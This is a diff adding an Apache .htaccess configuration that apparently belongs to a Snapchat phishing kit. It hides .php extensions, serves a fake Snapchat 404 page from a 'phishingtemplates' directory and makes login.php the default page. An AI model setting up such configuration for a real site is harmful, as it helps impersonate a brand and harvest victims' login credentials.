@@ -1,0 +1,11 @@
+# REMOVE .php / .html Extensions
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME}\.php -f
+RewriteRule ^(.*)$ $1.php [NC,L]
+
+# set custom original snapchat 404 page
+ErrorDocument 404 /phishingtemplates/snapchat/errorhandler/thisisawkward.php
+
+# set main index page by entering
+DirectoryIndex login.php
